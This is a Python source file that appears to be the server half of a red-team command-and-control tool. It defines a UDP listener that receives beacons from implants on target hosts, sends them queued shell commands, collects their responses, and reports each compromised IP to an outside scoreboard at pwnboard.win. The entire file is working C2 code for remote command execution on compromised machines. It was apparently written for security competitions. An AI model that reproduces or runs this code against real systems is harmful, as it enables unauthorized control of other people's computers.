import datetime
import queue
import socket
import struct
from threading import Thread
import requests

MAGIC_BYTES = b'\x42\x50\x3c\x33'
REQUEST_BYTE = b'\x01'
RAW_COMMAND_BYTE = b'\x02'
RESPONSE_BYTE = b'\x03'
KEEP_ALIVE_BYTE = b'\x04'
RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'


class BPServer(Thread):
    def __init__(self, local_udp_port, remote_udp_port, rooms, lock, execution_queue, push_queue):
        """
        Create a new udp server
        """
        Thread.__init__(self)
        self.rooms = rooms
        self.lock = lock
        self.is_listening = True
        self.udp_port = local_udp_port
        self.remote_port = remote_udp_port
        self.execution_queue = execution_queue
        self.push_queue = push_queue
        self.time_to_wait = 120
        self.time_waiting = datetime.datetime.now()

    @staticmethod
    def send_update(ip, name="BP"):
        host = "http://pwnboard.win/generic"
        d = {'ip': ip, 'type': name}
        try:
            requests.post(host, json=d, timeout=3)
            return True
        except Exception as E:
            return False

    def run(self):
        """
        Start udp server
        """
        self.sock = socket.socket(socket.AF_INET,
                                  socket.SOCK_DGRAM)
        self.sock.bind(("", self.udp_port))
        self.sock.setblocking(0)
        self.sock.settimeout(.1)
        target_cmds = {}
        while self.is_listening:
            try:
                data, address = self.sock.recvfrom(4096)
            except socket.timeout:
                try:
                    push_stage = self.push_queue.get_nowait()
                except queue.Empty:
                    continue
                for target in push_stage:
                    target_address = bytes(map(int, target.split('.')))
                    for cmd in push_stage[target]:
                        cmd = bytes(cmd, 'utf-8')
                        length = len(cmd).to_bytes(2, byteorder='big')
                        packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + b'\x00\x00\x00\x00' + target_address + length + cmd
                        self.sock.sendto(packet, (target, self.remote_port))
                continue
            except:
                continue
            elapsed = (datetime.datetime.now() - self.time_waiting).total_seconds()
            if len(target_cmds) == 0 or elapsed > self.time_to_wait:
                try:
                    target_cmds = self.execution_queue.get_nowait()
                    self.lock.acquire()
                    self.rooms.send(f'QUEUE {self.execution_queue.qsize()}')
                    self.lock.release()
                    self.time_waiting = datetime.datetime.now()
                except queue.Empty:
                    pass
            cur_target = ''
            target_address = bytes(map(int, address[0].split('.')))
            cmd_num = data[6:10]
            if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
                try:
                    cur_target = socket.inet_ntoa(struct.pack('!L', int.from_bytes(data[10:14], byteorder='big')))
                    self.send_update(cur_target)
                    for cmd in target_cmds[cur_target]:
                        cmd = bytes(cmd, 'utf-8')
                        length = len(cmd).to_bytes(2, byteorder='big')
                        packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + cmd_num + target_address + length + cmd
                        self.sock.sendto(packet, address)
                    target_cmds.pop(cur_target)
                except KeyError:
                    packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
                    self.sock.sendto(packet, address)
            elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
                cur_target = socket.inet_ntoa(struct.pack('!L', int.from_bytes(data[9:13], byteorder='big')))
                response_len = int.from_bytes(data[13:15], byteorder='big')
                response = data[15:15 + response_len].decode('utf-8')
                self.lock.acquire()
                self.rooms.send(f'RESPONSE {cur_target} {response}')
                self.lock.release()
            self.lock.acquire()
            try:
                if cur_target != '':
                    self.rooms.send(f'Target {cur_target}')
            except Exception as e:
                pass
                # print(e)
            finally:
                self.lock.release()
        self.stop()

    def stop(self):
        """
        Stop server
        """
        self.sock.close()
